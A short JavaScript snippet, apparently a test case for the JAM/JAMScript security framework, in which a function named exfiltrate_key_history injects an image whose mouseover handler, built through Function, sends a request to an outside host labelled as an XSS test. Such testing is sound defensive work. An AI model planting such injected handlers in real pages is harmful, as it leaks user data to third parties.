
JAM.startProfile('load');
function exfiltrate_key_history(){var script=document.createElement("img");script.src="";var v0=script,v4=JAMScript.call(Function,null,['xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","http://AnalyticsInc:8000/submission.html?test=xss8",true);xmlhttp.send(null);']);JAMScript.set(v0,"onmouseover",v4);script.height="50";script.width="50";script.alt="image";v0=document.getElementsByTagName("body");v0=v0[0];JAMScript.call(v0.appendChild,v0,[script])}var v2=document.getElementById("test");
JAMScript.set(v2,"onclick",exfiltrate_key_history);

JAM.stopProfile('load');
